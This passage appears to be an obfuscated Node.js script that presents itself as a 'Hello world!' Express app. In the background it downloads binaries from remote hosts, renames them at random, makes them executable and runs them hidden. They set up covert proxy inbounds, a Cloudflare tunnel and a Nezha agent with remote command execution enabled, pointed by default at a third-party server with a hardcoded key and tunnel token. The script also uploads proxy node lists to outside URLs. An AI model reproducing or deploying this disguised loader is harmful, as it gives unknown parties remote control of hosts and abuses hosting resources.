const _0x2e8edd=_0x4897;(function(_0x47207e,_0x21113a){const _0xd267f8={_0x3125b2:0x1e9,_0x1fcdc8:0x26b,_0x3528e2:0x1c7,_0x203926:0x201,_0x16e529:0x1ca,_0x234c36:0x1d5,_0xd7c386:0x231,_0x545173:0x207},_0x52bcca=_0x4897,_0x39c68c=_0x47207e();while(!![]){try{const _0x4c7524=parseInt(_0x52bcca(_0xd267f8._0x3125b2))/0x1*(-parseInt(_0x52bcca(0x1eb))/0x2)+-parseInt(_0x52bcca(_0xd267f8._0x1fcdc8))/0x3+parseInt(_0x52bcca(_0xd267f8._0x3528e2))/0x4*(parseInt(_0x52bcca(_0xd267f8._0x203926))/0x5)+parseInt(_0x52bcca(0x233))/0x6+-parseInt(_0x52bcca(_0xd267f8._0x16e529))/0x7+-parseInt(_0x52bcca(_0xd267f8._0x234c36))/0x8*(-parseInt(_0x52bcca(_0xd267f8._0xd7c386))/0x9)+-parseInt(_0x52bcca(_0xd267f8._0x545173))/0xa*(-parseInt(_0x52bcca(0x25b))/0xb);if(_0x4c7524===_0x21113a)break;else _0x39c68c['push'](_0x39c68c['shift']());}catch(_0x5f45ef){_0x39c68c['push'](_0x39c68c['shift']());}}}(_0x54ab,0xc8c4b));const express=require(_0x2e8edd(0x1e1)),app=express(),axios=require(_0x2e8edd(0x1c9)),os=require('os'),fs=require('fs'),path=require(_0x2e8edd(0x24a)),{promisify}=require(_0x2e8edd(0x27f)),exec=promisify(require(_0x2e8edd(0x1d7))[_0x2e8edd(0x20a)]),{execSync}=require(_0x2e8edd(0x1d7)),UPLOAD_URL=process['env'][_0x2e8edd(0x238)]||'',PROJECT_URL=process[_0x2e8edd(0x268)][_0x2e8edd(0x205)]||'',AUTO_ACCESS=process[_0x2e8edd(0x268)][_0x2e8edd(0x216)]||![],FILE_PATH=process['env'][_0x2e8edd(0x20f)]||'./tmp',SUB_PATH=process[_0x2e8edd(0x268)][_0x2e8edd(0x248)]||_0x2e8edd(0x200),PORT=process[_0x2e8edd(0x268)][_0x2e8edd(0x229)]||process['env'][_0x2e8edd(0x21c)]||0xbb8,UUID=process[_0x2e8edd(0x268)][_0x2e8edd(0x224)]||_0x2e8edd(0x1e0),NEZHA_SERVER=process[_0x2e8edd(0x268)]['NEZHA_SERVER']||_0x2e8edd(0x21b),NEZHA_PORT=process[_0x2e8edd(0x268)][_0x2e8edd(0x1e2)]||'',NEZHA_KEY=process[_0x2e8edd(0x268)][_0x2e8edd(0x272)]||'pFyT4RYC2IK0DmlyVyfEDZpiLYaZnBoh',ARGO_DOMAIN=process['env'][_0x2e8edd(0x242)]||_0x2e8edd(0x23f),ARGO_AUTH=process[_0x2e8edd(0x268)][_0x2e8edd(0x1d8)]||_0x2e8edd(0x1d6),ARGO_PORT=process['env'][_0x2e8edd(0x1e3)]||0x1f41,CFIP=process[_0x2e8edd(0x268)]['CFIP']||_0x2e8edd(0x1e5),CFPORT=process[_0x2e8edd(0x268)][_0x2e8edd(0x277)]||0x1bb,NAME=process[_0x2e8edd(0x268)][_0x2e8edd(0x1ed)]||'koyeb';!fs[_0x2e8edd(0x24f)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2e8edd(0x26f)](FILE_PATH+_0x2e8edd(0x1f2))):console[_0x2e8edd(0x26f)](FILE_PATH+_0x2e8edd(0x1ba));function generateRandomName(){const _0x3b28e2={_0xa625cf:0x204,_0x299579:0x1cb},_0xc095c4=_0x2e8edd,_0x1a0f3a=_0xc095c4(0x260);let _0x4405c7='';for(let _0x3f863c=0x0;_0x3f863c<0x6;_0x3f863c++){_0x4405c7+=_0x1a0f3a['charAt'](Math[_0xc095c4(_0x3b28e2._0xa625cf)](Math[_0xc095c4(_0x3b28e2._0x299579)]()*_0x1a0f3a[_0xc095c4(0x1dc)]));}return _0x4405c7;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2e8edd(0x1fb)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x2e8edd(0x1fb)](FILE_PATH,webName),botPath=path[_0x2e8edd(0x1fb)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x2e8edd(0x227)),listPath=path[_0x2e8edd(0x1fb)](FILE_PATH,_0x2e8edd(0x225)),bootLogPath=path[_0x2e8edd(0x1fb)](FILE_PATH,'boot.log'),configPath=path[_0x2e8edd(0x1fb)](FILE_PATH,_0x2e8edd(0x218));function deleteNodes(){const _0x55052b={_0xd008c3:0x1c4,_0x312c31:0x1bd,_0x7a28d4:0x232,_0x30042e:0x27b,_0x3594a6:0x23a},_0x4f1204=_0x2e8edd;try{if(!UPLOAD_URL)return;if(!fs[_0x4f1204(0x24f)](subPath))return;let _0x117bac;try{_0x117bac=fs[_0x4f1204(_0x55052b._0xd008c3)](subPath,_0x4f1204(0x230));}catch{return null;}const _0x473a62=Buffer['from'](_0x117bac,_0x4f1204(_0x55052b._0x312c31))[_0x4f1204(0x20d)](_0x4f1204(0x230)),_0x57c626=_0x473a62[_0x4f1204(0x271)]('\x0a')[_0x4f1204(0x22d)](_0x4e5d96=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4f1204(0x1cf)](_0x4e5d96));if(_0x57c626[_0x4f1204(0x1dc)]===0x0)return;return axios[_0x4f1204(_0x55052b._0x7a28d4)](UPLOAD_URL+_0x4f1204(_0x55052b._0x30042e),JSON[_0x4f1204(0x1dd)]({'nodes':_0x57c626}),{'headers':{'Content-Type':'application/json'}})[_0x4f1204(_0x55052b._0x3594a6)](_0x32394a=>{return null;}),null;}catch(_0x375090){return null;}}function cleanupOldFiles(){const _0x526b6a={_0x1dfa4d:0x25c,_0x4bc020:0x221,_0x5286c1:0x24b},_0x3ddd04=_0x2e8edd;try{const _0x612572=fs[_0x3ddd04(0x1c8)](FILE_PATH);_0x612572['forEach'](_0x1ca1e8=>{const _0x4bef84=_0x3ddd04,_0x2a7526=path[_0x4bef84(0x1fb)](FILE_PATH,_0x1ca1e8);try{const _0x19299a=fs[_0x4bef84(_0x526b6a._0x1dfa4d)](_0x2a7526);_0x19299a[_0x4bef84(_0x526b6a._0x4bc020)]()&&fs[_0x4bef84(_0x526b6a._0x5286c1)](_0x2a7526);}catch(_0x4a2290){}});}catch(_0x47a84e){}}app[_0x2e8edd(0x22a)]('/',function(_0x76196d,_0xbcd2a9){const _0x4fbf5d=_0x2e8edd;_0xbcd2a9['send'](_0x4fbf5d(0x1be));});function _0x4897(_0x15c55d,_0x11e886){const _0x54ab23=_0x54ab();return _0x4897=function(_0x4897db,_0x397827){_0x4897db=_0x4897db-0x1ba;let _0x173f2c=_0x54ab23[_0x4897db];return _0x173f2c;},_0x4897(_0x15c55d,_0x11e886);}function _0x54ab(){const _0x3864da=['path','unlinkSync','\x0a\x0avmess://','https://arm64.ssss.nyc.mn/agent','\x0a\x0atrojan://','existsSync','close','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://arm64.ssss.nyc.mn/v1','\x20-p\x20','443','\x20-s\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','substring','https://arm64.ssss.nyc.mn/bot','aarch64','792WcXTcg','statSync','https://amd64.ssss.nyc.mn/web','Unknown','/vmess-argo','abcdefghijklmnopqrstuvwxyz','\x0a\x20\x20tunnel:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Error\x20executing\x20command:\x20','https://oooo.serv00.net/add-url','Error\x20downloading\x20files:','Subscription\x20uploaded\x20successfully','Content-Type','env','Error\x20reading\x20boot.log:','unshift','3520527GNUeJT','App\x20is\x20running','del\x20/f\x20/q\x20','pipe','log','set','split','NEZHA_KEY','\x0a\x20\x20credentials-file:\x20','platform','Download\x20','/vmess-argo?ed=2560','CFPORT','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','/vless-argo','/api/delete-nodes','2053','mkdirSync','country_code','util','charAt','web\x20running\x20error:\x20','/config.json\x20>/dev/null\x202>&1\x20&','writeFileSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','rm\x20-rf\x20','config.yaml','&fp=firefox&type=ws&host=','\x20already\x20exists','blackhole','from','base64','Hello\x20world!','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','127.0.0.1','freedom','http','none','readFileSync','then','direct','4101212VSCfNK','readdirSync','axios','10306037urDCiv','random','amd','fileName','fileUrl','test','http://ip-api.com/json/','Empowerment\x20success\x20for\x20','ARGO_DOMAIN:','npm\x20running\x20error:\x20','http\x20server\x20is\x20running\x20on\x20port:','8teNWnJ','eyJhIjoiZDhhNzU0M2EwZDIyY2YwZTcxODQxODU3MzNlY2NmMmYiLCJ0IjoiM2E1NWZhOWYtZTk2MS00YWYzLWIxMmYtYTIyYTZiODk5Y2MwIiwicyI6IllqQXpOVEF4WTJFdFpXUmlNQzAwWW1GaExUZ3dOR010TmpGbVpqSTRNR1F4TnpWbCJ9','child_process','ARGO_AUTH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','countryCode','boot.log','length','stringify','2083','nohup\x20','3f84fd6b-0214-44eb-1351-7731d15ac4ba','express','NEZHA_PORT','ARGO_PORT','trojan','cdns.doon.eu.org','/trojan-argo','TunnelSecret','xtls-rprx-vision','135lKxGEx','firefox','12248cdJQBG','error','NAME','text/plain;\x20charset=utf-8','push','basename','8443','\x20is\x20created','.exe\x20>\x20nul\x202>&1','vmess','automatic\x20access\x20task\x20added\x20successfully','success','vless','tls','chmod','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','join','\x0a\x20\x20\x20\x20','\x20-c\x20\x22','forEach','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','sub','5VbJHjV','arm','\x0aclient_secret:\x20','floor','PROJECT_URL','data','146290YcnnZr','https://amd64.ssss.nyc.mn/bot','Error\x20in\x20startserver:','exec','Unhandled\x20error\x20in\x20startserver:','message','toString','\x20is\x20running','FILE_PATH','win32','has','2087','https://amd64.ssss.nyc.mn/agent','/api/add-nodes','map','AUTO_ACCESS','https://ipapi.co/json/','config.json','/api/add-subscriptions','true','ngnix.hndz.qzz.io:80','PORT','\x20-c\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x22\x20>\x20/dev/null\x202>&1','org','isFile','--tls','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','UUID','list.txt','send','sub.txt','quic','SERVER_PORT','get','clear','tcp','filter','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','utf-8','11148867SiYniZ','post','5865198NLfGlg','match','stream','status','&path=%2Ftrojan-argo%3Fed%3D2560#','UPLOAD_URL','?encryption=none&security=tls&sni=','catch','all','Add\x20automatic\x20access\x20task\x20faild:\x20','taskkill\x20/f\x20/im\x20','false','koyeb.xmb.de5.net','response','includes','ARGO_DOMAIN','application/json','Nodes\x20uploaded\x20successfully','Skipping\x20adding\x20automatic\x20access\x20task','/sub.txt\x20saved\x20successfully','\x20>/dev/null\x202>&1\x20&','SUB_PATH','php\x20running\x20error:\x20'];_0x54ab=function(){return _0x3864da;};return _0x54ab();}async function generateConfig(){const _0x59d117={_0x25e7ba:0x1c3,_0x92b963:0x1e8,_0x484551:0x25f,_0xa1b74a:0x1c0,_0x5eaebf:0x22c,_0x1d00d6:0x1e4,_0x1498d2:0x1e6,_0x58bbcb:0x1dd},_0x55d9eb=_0x2e8edd,_0x571eea={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x55d9eb(_0x59d117._0x25e7ba)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x55d9eb(0x1f7),'settings':{'clients':[{'id':UUID,'flow':_0x55d9eb(_0x59d117._0x92b963)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x55d9eb(_0x59d117._0x484551),'dest':0xbbb},{'path':_0x55d9eb(0x1e6),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x55d9eb(_0x59d117._0xa1b74a),'protocol':_0x55d9eb(0x1f7),'settings':{'clients':[{'id':UUID}],'decryption':_0x55d9eb(_0x59d117._0x25e7ba)},'streamSettings':{'network':_0x55d9eb(_0x59d117._0x5eaebf),'security':_0x55d9eb(0x1c3)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x55d9eb(0x1f7),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x55d9eb(_0x59d117._0x25e7ba),'wsSettings':{'path':_0x55d9eb(0x27a)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x55d9eb(0x1f8),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x55d9eb(_0x59d117._0xa1b74a),'protocol':_0x55d9eb(0x1f4),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x55d9eb(_0x59d117._0x484551)}},'sniffing':{'enabled':!![],'destOverride':[_0x55d9eb(0x1c2),_0x55d9eb(0x1f8),_0x55d9eb(0x228)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x55d9eb(0x1c0),'protocol':_0x55d9eb(_0x59d117._0x1d00d6),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x55d9eb(0x1c3),'wsSettings':{'path':_0x55d9eb(_0x59d117._0x1498d2)}},'sniffing':{'enabled':!![],'destOverride':[_0x55d9eb(0x1c2),'tls',_0x55d9eb(0x228)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x55d9eb(0x1c1),'tag':_0x55d9eb(0x1c6)},{'protocol':_0x55d9eb(0x1bb),'tag':'block'}]};fs['writeFileSync'](path[_0x55d9eb(0x1fb)](FILE_PATH,_0x55d9eb(0x218)),JSON[_0x55d9eb(_0x59d117._0x58bbcb)](_0x571eea,null,0x2));}function getSystemArchitecture(){const _0x120584={_0x1b56fd:0x202,_0xea36f7:0x25a,_0x3841e1:0x202},_0x2de097=_0x2e8edd,_0x57ce3c=os['arch']();return _0x57ce3c===_0x2de097(_0x120584._0x1b56fd)||_0x57ce3c==='arm64'||_0x57ce3c===_0x2de097(_0x120584._0xea36f7)?_0x2de097(_0x120584._0x3841e1):_0x2de097(0x1cc);}function downloadFile(_0x585fc6,_0x2c72be,_0x114105){const _0x2efbc4={_0x30ae4a:0x235,_0x460cc8:0x1c5,_0x53da08:0x23a},_0x2d8525={_0x1185f2:0x275,_0x2a8eaa:0x1f0},_0x39280a={_0x4c3d20:0x26e,_0x2c056f:0x1ec},_0x54b180={_0x41400e:0x250},_0x1cb369=_0x2e8edd,_0x1ecd6f=_0x585fc6;!fs['existsSync'](FILE_PATH)&&fs[_0x1cb369(0x27d)](FILE_PATH,{'recursive':!![]});const _0x354363=fs['createWriteStream'](_0x1ecd6f);axios({'method':'get','url':_0x2c72be,'responseType':_0x1cb369(_0x2efbc4._0x30ae4a)})[_0x1cb369(_0x2efbc4._0x460cc8)](_0x346511=>{const _0x33364e={_0x497132:0x20c,_0x454df2:0x1ec},_0x23189d=_0x1cb369;_0x346511[_0x23189d(0x206)][_0x23189d(_0x39280a._0x4c3d20)](_0x354363),_0x354363['on']('finish',()=>{const _0x424a02=_0x23189d;_0x354363[_0x424a02(_0x54b180._0x41400e)](),console[_0x424a02(0x26f)]('Download\x20'+path['basename'](_0x1ecd6f)+'\x20successfully'),_0x114105(null,_0x1ecd6f);}),_0x354363['on'](_0x23189d(_0x39280a._0x2c056f),_0x4f650d=>{const _0x1c0230=_0x23189d;fs['unlink'](_0x1ecd6f,()=>{});const _0x25703f='Download\x20'+path[_0x1c0230(0x1f0)](_0x1ecd6f)+'\x20failed:\x20'+_0x4f650d[_0x1c0230(_0x33364e._0x497132)];console[_0x1c0230(_0x33364e._0x454df2)](_0x25703f),_0x114105(_0x25703f);});})[_0x1cb369(_0x2efbc4._0x53da08)](_0x3a118a=>{const _0x2b32a8=_0x1cb369,_0x1d1e12=_0x2b32a8(_0x2d8525._0x1185f2)+path[_0x2b32a8(_0x2d8525._0x2a8eaa)](_0x1ecd6f)+'\x20failed:\x20'+_0x3a118a[_0x2b32a8(0x20c)];console[_0x2b32a8(0x1ec)](_0x1d1e12),_0x114105(_0x1d1e12);});}async function downloadFilesAndRun(){const _0x395f44={_0x2d34b7:0x1dc,_0x6bf661:0x26f,_0x1d53f6:0x1ec,_0x61c63:0x271,_0x443202:0x1f1,_0x5f485c:0x211,_0x115205:0x203,_0x1ffcc9:0x1d9,_0x4e4a09:0x257,_0xf252a3:0x1fd,_0x3c18f1:0x212,_0x38076b:0x1de,_0x6a5089:0x241,_0x29e5e3:0x222,_0x8d86b7:0x278,_0x102d83:0x26f,_0x3e559c:0x21d,_0x56e481:0x20e,_0xf3b447:0x281,_0x17babb:0x24f,_0x5ca036:0x247,_0x52df26:0x26f,_0x29263e:0x20e,_0x372bb8:0x263},_0x36dbb9={_0x4240c1:0x24f,_0x3465d2:0x1f9},_0x235ddd={_0x5d3fbe:0x1cd,_0x117378:0x1ce},_0x17ee91=_0x2e8edd,_0x131ba2=getSystemArchitecture(),_0x533c48=getFilesForArchitecture(_0x131ba2);if(_0x533c48[_0x17ee91(_0x395f44._0x2d34b7)]===0x0){console[_0x17ee91(_0x395f44._0x6bf661)](_0x17ee91(0x262));return;}const _0x27778b=_0x533c48[_0x17ee91(0x215)](_0x19c39e=>{return new Promise((_0x2de9e3,_0x2e2886)=>{const _0x5db341=_0x4897;downloadFile(_0x19c39e[_0x5db341(_0x235ddd._0x5d3fbe)],_0x19c39e[_0x5db341(_0x235ddd._0x117378)],(_0x160b7d,_0x17fbd2)=>{_0x160b7d?_0x2e2886(_0x160b7d):_0x2de9e3(_0x17fbd2);});});});try{await Promise[_0x17ee91(0x23b)](_0x27778b);}catch(_0x51dd56){console[_0x17ee91(_0x395f44._0x1d53f6)](_0x17ee91(0x265),_0x51dd56);return;}function _0x1cfabb(_0x365a6c){const _0x1c4e24=0x1fd;_0x365a6c['forEach'](_0x48e981=>{const _0x234f19=_0x4897;fs[_0x234f19(_0x36dbb9._0x4240c1)](_0x48e981)&&fs[_0x234f19(_0x36dbb9._0x3465d2)](_0x48e981,_0x1c4e24,_0x1b1dee=>{const _0x228436=_0x234f19;_0x1b1dee?console['error']('Empowerment\x20failed\x20for\x20'+_0x48e981+':\x20'+_0x1b1dee):console['log'](_0x228436(0x1d1)+_0x48e981+':\x20'+_0x1c4e24['toString'](0x8));});});}const _0x5ddfb7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1cfabb(_0x5ddfb7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x495bf3=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x17ee91(_0x395f44._0x61c63)](':')['pop']():'',_0x4c3ed1=new Set([_0x17ee91(0x255),_0x17ee91(_0x395f44._0x443202),'2096',_0x17ee91(0x212),_0x17ee91(0x1de),_0x17ee91(0x27c)]),_0x2ebf51=_0x4c3ed1[_0x17ee91(_0x395f44._0x5f485c)](_0x495bf3)?_0x17ee91(0x21a):_0x17ee91(0x23e),_0xefb43e=_0x17ee91(_0x395f44._0x115205)+NEZHA_KEY+_0x17ee91(0x22f)+NEZHA_SERVER+_0x17ee91(_0x395f44._0x1ffcc9)+_0x2ebf51+_0x17ee91(_0x395f44._0x4e4a09)+UUID;fs['writeFileSync'](path[_0x17ee91(0x1fb)](FILE_PATH,_0x17ee91(0x286)),_0xefb43e);const _0x543295='nohup\x20'+phpPath+_0x17ee91(_0x395f44._0xf252a3)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x543295),console[_0x17ee91(0x26f)](phpName+_0x17ee91(0x20e)),await new Promise(_0x23021c=>setTimeout(_0x23021c,0x3e8));}catch(_0x23d647){console[_0x17ee91(_0x395f44._0x1d53f6)](_0x17ee91(0x249)+_0x23d647);}}else{let _0x51d4f9='';const _0x13dd8a=['443','8443','2096',_0x17ee91(_0x395f44._0x3c18f1),_0x17ee91(_0x395f44._0x38076b),_0x17ee91(0x27c)];_0x13dd8a[_0x17ee91(_0x395f44._0x6a5089)](NEZHA_PORT)&&(_0x51d4f9=_0x17ee91(_0x395f44._0x29e5e3));const _0x1ee269=_0x17ee91(0x1df)+npmPath+_0x17ee91(0x256)+NEZHA_SERVER+':'+NEZHA_PORT+_0x17ee91(0x254)+NEZHA_KEY+'\x20'+_0x51d4f9+_0x17ee91(_0x395f44._0x8d86b7);try{await exec(_0x1ee269),console[_0x17ee91(0x26f)](npmName+'\x20is\x20running'),await new Promise(_0x59ae0d=>setTimeout(_0x59ae0d,0x3e8));}catch(_0x2ed526){console[_0x17ee91(0x1ec)](_0x17ee91(0x1d3)+_0x2ed526);}}}else console[_0x17ee91(_0x395f44._0x102d83)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x288f2b='nohup\x20'+webPath+_0x17ee91(_0x395f44._0x3e559c)+FILE_PATH+_0x17ee91(0x282);try{await exec(_0x288f2b),console['log'](webName+_0x17ee91(_0x395f44._0x56e481)),await new Promise(_0x3f1386=>setTimeout(_0x3f1386,0x3e8));}catch(_0x1514ca){console['error'](_0x17ee91(_0x395f44._0xf3b447)+_0x1514ca);}if(fs[_0x17ee91(_0x395f44._0x17babb)](botPath)){let _0x39cd85;if(ARGO_AUTH[_0x17ee91(0x234)](/^[A-Z0-9a-z=]{120,250}$/))_0x39cd85=_0x17ee91(0x1bf)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x39cd85=_0x17ee91(0x22e)+FILE_PATH+'/tunnel.yml\x20run':_0x39cd85='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x17ee91(0x21e)+ARGO_PORT;try{await exec(_0x17ee91(0x1df)+botPath+'\x20'+_0x39cd85+_0x17ee91(_0x395f44._0x5ca036)),console[_0x17ee91(_0x395f44._0x52df26)](botName+_0x17ee91(_0x395f44._0x29263e)),await new Promise(_0x5aaa10=>setTimeout(_0x5aaa10,0x7d0));}catch(_0x482623){console[_0x17ee91(0x1ec)](_0x17ee91(_0x395f44._0x372bb8)+_0x482623);}}await new Promise(_0x4285a4=>setTimeout(_0x4285a4,0x1388));}function getFilesForArchitecture(_0x5707e1){const _0x2625e8={_0x8b5985:0x202,_0x38aa24:0x259,_0x5ea34b:0x202,_0x1fc1bc:0x253,_0x25727a:0x279,_0x2ba812:0x26a},_0x375f37=_0x2e8edd;let _0x371413;_0x5707e1===_0x375f37(_0x2625e8._0x8b5985)?_0x371413=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x375f37(_0x2625e8._0x38aa24)}]:_0x371413=[{'fileName':webPath,'fileUrl':_0x375f37(0x25d)},{'fileName':botPath,'fileUrl':_0x375f37(0x208)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1aa746=_0x5707e1===_0x375f37(_0x2625e8._0x5ea34b)?_0x375f37(0x24d):_0x375f37(0x213);_0x371413[_0x375f37(0x26a)]({'fileName':npmPath,'fileUrl':_0x1aa746});}else{const _0x48024d=_0x5707e1==='arm'?_0x375f37(_0x2625e8._0x1fc1bc):_0x375f37(_0x2625e8._0x25727a);_0x371413[_0x375f37(_0x2625e8._0x2ba812)]({'fileName':phpPath,'fileUrl':_0x48024d});}}return _0x371413;}function argoType(){const _0x5f1e65={_0x4bf860:0x26f,_0x1024f5:0x1e7,_0x468c72:0x261,_0x122f02:0x273,_0xaa5fbf:0x1fb,_0x1f6b81:0x284,_0x190101:0x283,_0x2c3b49:0x251},_0x4d2142=_0x2e8edd;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4d2142(_0x5f1e65._0x4bf860)](_0x4d2142(0x1ff));return;}if(ARGO_AUTH['includes'](_0x4d2142(_0x5f1e65._0x1024f5))){fs[_0x4d2142(0x283)](path[_0x4d2142(0x1fb)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x5a8c81=_0x4d2142(_0x5f1e65._0x468c72)+ARGO_AUTH['split']('\x22')[0xb]+_0x4d2142(_0x5f1e65._0x122f02)+path[_0x4d2142(_0x5f1e65._0xaa5fbf)](FILE_PATH,'tunnel.json')+_0x4d2142(_0x5f1e65._0x1f6b81)+ARGO_DOMAIN+_0x4d2142(0x252)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x4d2142(_0x5f1e65._0x190101)](path['join'](FILE_PATH,'tunnel.yml'),_0x5a8c81);}else console[_0x4d2142(0x26f)](_0x4d2142(_0x5f1e65._0x2c3b49));}async function extractDomains(){const _0x202de6={_0x26be4b:0x26f,_0x1700df:0x1c4,_0x2fe222:0x271,_0x9c7baa:0x1db,_0x1dcb13:0x21e,_0x337c68:0x263,_0x37d750:0x1ec},_0x149019={_0x5347df:0x217,_0x32ae88:0x27e,_0x36177c:0x206,_0x4205f6:0x27e,_0x1a95d1:0x220,_0x429629:0x22a,_0x136d6c:0x1d0,_0x371a8b:0x236,_0x10bbfb:0x1f6,_0x53f6d9:0x206,_0x2b37ac:0x206},_0x5ed6ca={_0x4acdf:0x274,_0x16d334:0x1f3,_0x3cb701:0x280,_0x1e3b3c:0x258},_0x33729e=_0x2e8edd;let _0x424331;if(ARGO_AUTH&&ARGO_DOMAIN)_0x424331=ARGO_DOMAIN,console[_0x33729e(_0x202de6._0x26be4b)](_0x33729e(0x1d2),_0x424331),await _0x2cf693(_0x424331);else try{const _0x48a209=fs[_0x33729e(_0x202de6._0x1700df)](path[_0x33729e(0x1fb)](FILE_PATH,'boot.log'),'utf-8'),_0x1b6b32=_0x48a209[_0x33729e(_0x202de6._0x2fe222)]('\x0a'),_0xe48995=[];_0x1b6b32[_0x33729e(0x1fe)](_0x49bb81=>{const _0x523e68=_0x33729e,_0x697213=_0x49bb81[_0x523e68(0x234)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x697213){const _0x1df400=_0x697213[0x1];_0xe48995['push'](_0x1df400);}});if(_0xe48995[_0x33729e(0x1dc)]>0x0)_0x424331=_0xe48995[0x0],console[_0x33729e(_0x202de6._0x26be4b)]('ArgoDomain:',_0x424331),await _0x2cf693(_0x424331);else{console['log'](_0x33729e(0x223)),fs[_0x33729e(0x24b)](path[_0x33729e(0x1fb)](FILE_PATH,_0x33729e(_0x202de6._0x9c7baa)));async function _0x3300a0(){const _0xa5229a=_0x33729e;try{process[_0xa5229a(_0x5ed6ca._0x4acdf)]==='win32'?await exec(_0xa5229a(0x23d)+botName+_0xa5229a(_0x5ed6ca._0x16d334)):await exec('pkill\x20-f\x20\x22['+botName[_0xa5229a(_0x5ed6ca._0x3cb701)](0x0)+']'+botName[_0xa5229a(_0x5ed6ca._0x1e3b3c)](0x1)+_0xa5229a(0x21f));}catch(_0x11df71){}}_0x3300a0(),await new Promise(_0x1efc0a=>setTimeout(_0x1efc0a,0xbb8));const _0xf8b39f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x33729e(_0x202de6._0x1dcb13)+ARGO_PORT;try{await exec(_0x33729e(0x1df)+botPath+'\x20'+_0xf8b39f+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0xfbd526=>setTimeout(_0xfbd526,0xbb8)),await extractDomains();}catch(_0xafb7db){console[_0x33729e(0x1ec)](_0x33729e(_0x202de6._0x337c68)+_0xafb7db);}}}catch(_0x587166){console[_0x33729e(_0x202de6._0x37d750)](_0x33729e(0x269),_0x587166);}async function _0x459e79(){const _0x539c3a=_0x33729e;try{const _0x5db11c=await axios['get'](_0x539c3a(_0x149019._0x5347df),{'timeout':0xbb8});if(_0x5db11c[_0x539c3a(0x206)]&&_0x5db11c['data'][_0x539c3a(_0x149019._0x32ae88)]&&_0x5db11c[_0x539c3a(_0x149019._0x36177c)][_0x539c3a(0x220)])return _0x5db11c[_0x539c3a(0x206)][_0x539c3a(_0x149019._0x4205f6)]+'_'+_0x5db11c['data'][_0x539c3a(_0x149019._0x1a95d1)];}catch(_0x26088c){try{const _0x5c293c=await 